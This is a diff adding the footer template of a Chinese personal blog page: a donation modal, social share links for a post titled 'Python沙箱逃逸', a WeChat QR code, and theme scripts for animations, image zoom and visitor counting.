+    
+        
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        <span>感谢您的鼓励支持！</span>
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" data-img="/img/dog.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/weixin.png" data-alipay="/img/zhifubao.png">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechatPay">&nbsp;&nbsp;微信&nbsp;&nbsp;</span>
+                <span class="reward-toggle-item alipayPay">支付宝</span>
+            </div>
+        </label>
+        
+        <i class="icon icon-caret-up"></i>
+    </div>
+</div>
+
+
+    
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://Foxgrin.github.io/posts/57375/&title=《Python沙箱逃逸》 — Somnus's blog&pic=https://Foxgrin.github.io/img/touxiang/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Foxgrin.github.io/posts/57375/&title=《Python沙箱逃逸》 — Somnus's blog&source=之前接触的大部分是PHP写的服务器端，而除了PHP，Python也可以作为服务器端的语言，利用的是Python的flask模块渲染html模板，同时也可能..." data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://Foxgrin.github.io/posts/57375/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Python沙箱逃逸》 — Somnus's blog&url=https://Foxgrin.github.io/posts/57375/&via=https://Foxgrin.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://Foxgrin.github.io/posts/57375/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p class="wechatshare">扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAABy0lEQVR42u3aO47DMAwFQN//0t42jZRHStYayKgy4kQepyD40XXF6/5Yo88/746+n9zdsHBxcZe593TNWfnjq/sP98TFxT3IHT1gdD1Cz69HOyQGXFzcN3Pnv03SGlxc3N/k5kkPLi7um7m9QFO9m6RN22o1XFzcBW7epXzu+pH+Li4ubot7F1cyPllpwn75FS4u7hFuHlCSpKc6WO09FxcX9ww3b4Cuj2N7rdUr3wIXF3cTd9fhiWrl0myO4OLiHuf2QlKSylR3G/4duLi4R7jzgJI/svdKyZ64uLhv4K4cp1gfkUY74OLiPsbNQ1K1dKm+dtRmxcXFPcLNi5bmpsXiqtB2wcXFfYxbPVqRD1Gq7ZJocIuLi3uE2wtDvcFJtWlSiLi4uLhHuNWQ1Ht8EraiQIaLi3uE2zuqlSQuK2USLi7uf3HzJkheLPVGsOVJCy4u7ibuXVzVwxl5EIxeBhcX9wi3dyQiT3eqqdJ6oYWLi7uL25vK5kXO/FWrTRlcXNyT3OpIo5qsVMcwXwIZLi7uy7hJsFtvkpa7Jri4uK/h5klPoYM7/z4uLu5Bbt4k3Vvk5KUULi7uSW7vcFXSQq22R/O/ABcX9zHuH8274jEPojIPAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <!-- waves按钮特效 -->
+<script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<!-- 主题配置脚本 -->
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+</script>
+
+<!-- jquery -->
+<script src="/js/jquery.min.js?v=3.0"></script>
+
+<!-- 搜索 -->
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item waves-block waves-effect" onclick="location.href='{path}'">
+    <div class="title ellipsis" title="{title}">{title}</div>
+</li>
+</template>
+
+
+<!-- main博客脚本 -->
+<script src="/js/main.min.js?v=3.0" ></script>
+
+<!-- 动画&配置 -->
+<script src="/js/script.min.js?v=3.0" ></script>
+
+<!-- 脚本管理 -->
+<script>
+
+if(window.innerWidth > 800){
+	/* 3D标题 */
+	$(".content-header").on("mousemove", threedee);
+
+	/* 底部追随鼠标 */
+	$(".footer").hover(2);
+
+	/* gotop键的涟漪 */
+	$("#gotop").hover(1);
+
+	/* 赞赏的粒子雨 */
+	$("#reward").hover(3);
+
+	/* 微信公众号的底部渲染 */
+	$("#wechat").hover(4);
+
+    /* 标题跳动 */
+    $(".archivestitle").bumpyText();
+
+	/* 图片点击放大 */
+	const postimg = jQuery(".post-content img:not(.github-emoji)");
+	postimg.on("click",function(){
+
+		mask.classList.add("in");
+		main.classList.add("Mask");
+		menu.classList.add("Mask");
+		var myimg = this.cloneNode(true);
+		myimg.classList.add("imgShow");
+
+		setTimeout(function(){
+			jQuery(myimg).animate({
+				opacity:"1"
+			},1000);
+		},0);
+
+		document.body.appendChild(myimg);
+
+		myimg.onclick=function(){
+			document.body.removeChild(myimg);
+			mask.classList.remove("in");
+			main.classList.remove("Mask");
+			menu.classList.remove("Mask");
+		};
+
+	});
+
+}
+
+/* 名字跳动 */
+$("#name").bumpyText();
+
+
+/* 网站运行时间 */
+setInterval(function () {
+	setTime("2018/7/9");
+}, 1000);
+
+/* 文章块的淡出 */
+postshow();
+
+/* 座右铭 */
+
+   getHitokoto();
+
+
+
+/* 粘贴提示 */
+G($(".post-content"), location.href, "Somnus");
+
+
+/* 控制台 */
+if (window.console && window.console.log) {
+	setTimeout(function () {
+		console.log("\n %c 一个坏掉的番茄 %c  © Simon Ma  http://tomotoes.com \n\n", "color:#FFFFFB;background:#1abc9c;padding:5px 0;border-radius:.5rem 0 0 .5rem;", "color:#FFFFFB;background:#080808;padding:5px 0;border-radius:0 .5rem .5rem 0;");
+	}, 0);
+}
+
+</script>
+
+
+
+
+<!-- 公式渲染 -->
+
+
+
+<!-- 不蒜子 -->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+</body>
+</html>
